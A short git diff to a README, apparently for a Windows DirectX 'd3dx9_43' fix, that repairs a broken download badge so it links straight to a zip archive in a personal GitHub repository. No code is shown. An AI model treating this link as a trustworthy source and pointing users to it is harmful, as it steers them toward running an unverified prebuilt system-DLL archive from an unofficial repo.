@@ -5,7 +5,7 @@
 [![Windows](https://img.shields.io/badge/Platform-Windows-blue?logo=windows)](https://www.microsoft.com/windows)
 [![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
 [![Status](https://img.shields.io/badge/Status-Active-success)]()
-[![Donwload](https://img.shields.io/badge/donwload-success)]([DirectX-fix-d3dx9_43.zip](https://github.com/kathe6942/DirectX-fix-d3dx9_43.dll/blob/main/DirectX-fix-d3dx9_43.zip))
+[![Donwload](https://img.shields.io/badge/donwload-success)](https://github.com/kathe6942/DirectX-fix-d3dx9_43.dll/blob/main/DirectX-fix-d3dx9_43.zip)
 
 ---
 
